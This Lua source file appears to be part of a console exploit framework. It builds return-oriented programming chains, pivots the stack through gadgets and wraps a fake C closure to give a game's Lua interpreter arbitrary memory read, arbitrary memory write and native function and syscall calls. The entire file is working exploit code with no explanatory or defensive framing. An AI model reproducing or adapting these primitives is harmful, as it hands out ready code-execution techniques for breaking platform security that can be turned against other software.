
native_cmd = {
    read_buffer = 0,
    write_buffer = 1,
    fcall = 2,
}

native = {}

function native.init()

    local pivot_handler = gadgets.stack_pivot[2]
    native.pivot_handler_rop = native.setup_pivot_handler(pivot_handler)
    
    native_cmd_handler = native.create_cmd_handler()
    native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)

    syscall.do_sanity_check()
end

function native.get_lua_opt(chain, fn, a1, a2, a3)
    chain:push_fcall_raw(fn, function()
        chain:push_set_rdx(a3)
        chain:push_set_rsi(a2)
        chain:push_set_reg_from_memory("rdi", a1)
    end)
    chain:push_store_retval()
end

function native.gen_fcall_chain(lua_state)

    local chain = ropchain()
    
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - fn addr
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - rax (for syscall)
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 5, 0)  -- 3 - rdi
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 6, 0)  -- 4 - rsi
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 7, 0)  -- 5 - rdx
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 8, 0)  -- 6 - rcx
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 9, 0)  -- 7 - r8
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 10, 0)  -- 8 - r9

    local prep_arg_callback = function()
        chain:push_set_reg_from_memory("r9", chain.retval_addr[8])
        chain:push_set_reg_from_memory("r8", chain.retval_addr[7])
        chain:push_set_reg_from_memory("rcx", chain.retval_addr[6])
        chain:push_set_reg_from_memory("rdx", chain.retval_addr[5])
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[4])
        chain:push_set_reg_from_memory("rdi", chain.retval_addr[3])
        chain:push_set_rax_from_memory(chain.retval_addr[2])
    end

    chain:push_fcall_raw(chain.retval_addr[1], prep_arg_callback, true)
    chain:push_store_retval()

    -- pass return value to caller
    chain:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[9])
        chain:push_set_reg_from_memory("rdi", lua_state)
    end)

    return chain
end

function native.gen_read_buffer_chain(lua_state)

    local chain = ropchain()

    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - addr to read
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - size

    chain:push_fcall_raw(eboot_addrofs.lua_pushlstring, function()
        chain:push_set_reg_from_memory("rdx", chain.retval_addr[2])
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[1])
        chain:push_set_reg_from_memory("rdi", lua_state)
    end)

    return chain
end

function native.gen_write_buffer_chain(lua_state)

    local chain = ropchain()

    chain.string_len = memory.alloc(0x8)

    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - dest to write
    native.get_lua_opt(chain, eboot_addrofs.luaL_checklstring, lua_state, 4, chain.string_len)  -- 2 - src buffer

    chain:push_fcall_raw(libc_addrofs.memcpy, function()
        chain:push_set_reg_from_memory("rdx", chain.string_len)
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[2])
        chain:push_set_reg_from_memory("rdi", chain.retval_addr[1])
    end)

    return chain
end

function native.setup_cmd_handler(pivot_handler)

    -- todo: setting hardcoded offset like this is bad. improve this
    local stack_offset = -0x78
    if game_name == "HamidashiCreative" then
        stack_offset = -0x68
    end

    local chain = ropchain()

    chain.jmpbuf = memory.alloc(0x100)
    chain.jump_table = memory.alloc(0x8 * 16)
    chain.lua_state = memory.alloc(0x8)

    -- get lua state from pivot handler
    chain:push_set_rax_from_memory(pivot_handler.lua_state_addr)
    chain:push_store_rax_into_memory(chain.lua_state)

    chain:push_fcall(libc_addrofs.scePthreadMutexUnlock, pivot_handler.lock)

    -- hacky way to recover rbp
    chain:push_fcall(libc_addrofs.setjmp, chain.jmpbuf)
    chain:push_set_rax_from_memory(chain.jmpbuf+0x18) -- get rbp

    -- fix jmpbuf
    chain:push_add_to_rax(stack_offset)  -- calc rsp from rbp
    chain:push_store_rax_into_memory(chain.jmpbuf+0x10)  -- fix rsp
    chain:push(gadgets["mov rax, [rax]; ret"])  -- get ret addr from rsp
    chain:push_store_rax_into_memory(chain.jmpbuf)  -- fix rip

    -- get native cmd option from caller
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state, 2, 0)

    -- pivot to appropriate handler
    chain:push_set_rax_from_memory(chain.retval_addr[1])
    chain:dispatch_jumptable_with_rax_index(chain.jump_table)

    return chain
end

function native.setup_native_handler(command_handler)

    local handler = {
        native.gen_read_buffer_chain(command_handler.lua_state),
        native.gen_write_buffer_chain(command_handler.lua_state),
        native.gen_fcall_chain(command_handler.lua_state),
    }

    for i, each_handler in ipairs(handler) do
        each_handler:restore_through_longjmp(command_handler.jmpbuf)
        memory.write_qword(command_handler.jump_table + 8*(i-1), each_handler.stack_base)    
    end

    return handler
end

function native.setup_pivot_handler(pivot_handler)

    local jmpbuf = memory.alloc(0x60)

    syscall_mmap(pivot_handler.pivot_base, 0x2000)

    local chain = ropchain({
        stack_base = pivot_handler.pivot_addr,
    })

    -- rbx = rdi (lua state)
    -- rbx is usually preserved across fn calls
    chain:push_set_reg_from_rdi("rbx")

    chain.lock = memory.alloc(0x8)
    chain:push_fcall(libc_addrofs.scePthreadMutexLock, chain.lock)

    -- hacky way to recover rbx (lua state)
    chain:push_fcall(libc_addrofs.setjmp, jmpbuf)
    chain.lua_state_addr = jmpbuf + 0x8

    -- get native cmd handler from caller
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state_addr, 1, 0)

    -- pivot to native cmd handler
    chain:push_set_reg_from_memory("rsp", chain.retval_addr[1])
    
    return chain
end

function native.create_cmd_handler()
    local cmd_handler = native.setup_cmd_handler(native.pivot_handler_rop)
    native.setup_native_handler(cmd_handler)
    return cmd_handler.stack_base:tonumber()
end

function native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
    assert(fn_addr)
    return uint64(native_invoke(
        native_cmd_handler,
        native_cmd.fcall,
        uint64(fn_addr):tonumber(),
        uint64(rax or 0):tonumber(),
        ropchain.resolve_value(rdi or 0):tonumber(),
        ropchain.resolve_value(rsi or 0):tonumber(),
        ropchain.resolve_value(rdx or 0):tonumber(),
        ropchain.resolve_value(rcx or 0):tonumber(),
        ropchain.resolve_value(r8 or 0):tonumber(),
        ropchain.resolve_value(r9 or 0):tonumber()
    ))
end

function native.fcall(fn_addr, rdi, rsi, rdx, rcx, r8, r9)
    return native.fcall_with_rax(fn_addr, nil, rdi, rsi, rdx, rcx, r8, r9)
end

function native.read_buffer(addr, size)
    assert(addr and size)
    return native_invoke(
        native_cmd_handler,
        native_cmd.read_buffer,
        ropchain.resolve_value(addr):tonumber(),
        ropchain.resolve_value(size):tonumber()
    )
end

function native.write_buffer(addr, buf)
    assert(addr and buf)
    native_invoke(
        native_cmd_handler,
        native_cmd.write_buffer,
        ropchain.resolve_value(addr):tonumber(),
        buf
    )
end